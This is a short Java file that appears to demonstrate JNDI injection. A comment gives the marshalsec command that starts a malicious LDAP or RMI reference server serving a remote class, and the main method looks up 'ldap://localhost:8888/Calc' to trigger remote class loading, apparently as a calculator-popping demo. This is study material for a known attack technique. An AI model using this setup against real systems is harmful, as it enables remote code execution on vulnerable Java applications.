package JNDI.LDAPMethod;

import javax.naming.InitialContext;

/*
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
 */
public class JNDIClient {
    public static void main(String[] args) throws Exception {
        InitialContext context = new InitialContext();
        context.lookup("ldap://localhost:8888/Calc");
    }
}
